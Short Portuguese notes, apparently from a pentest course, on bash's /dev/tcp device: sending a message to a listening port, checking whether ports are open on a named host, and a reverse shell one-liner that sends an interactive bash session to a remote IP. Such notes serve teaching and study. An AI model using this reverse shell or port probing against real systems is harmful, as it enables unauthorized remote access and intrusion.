/dev/tcp
É uma forma de abrir um socket e enviar mensagem

Enviando uma mensagem
Outro computador deve estar com a porta 4545 aberta e escutando e na nossa maquina colocamos:
	echo "TESTE" > /dev/tcp/192.168.124.199/4545
Na maquina com a porta 4545 aberta será impresso a palavra TESTE.

Uma forma de saber se uma porta está aberta e conectando:
	>/dev/tcp/172.168.1.12/4545
Caso se conecte não é mostrado nenhuma mensagem no terminal, caso não conecte é mostrado uma mensagem de erro no terminal
	>/dev/tcp/www.businesscorp.com.br/21 && echo "Porta Aberta"     -- nesse caso se não retornar mensagem de erro é impresso a mensagem de porta aberta.

Enviado a shell pelo /dev/tcp
	bash -i > /dev/tcp/192.168.124.199/4545 0>&1 2>&1   -- O "0>&1" é referente ao STDIN(entrada) e o "2>&1" é pelo STDOUT(erro) o numero "1" nos dois casos é a saida do terminal, é escrito dessa forma pois é enviado esses dados para o outro terminal.
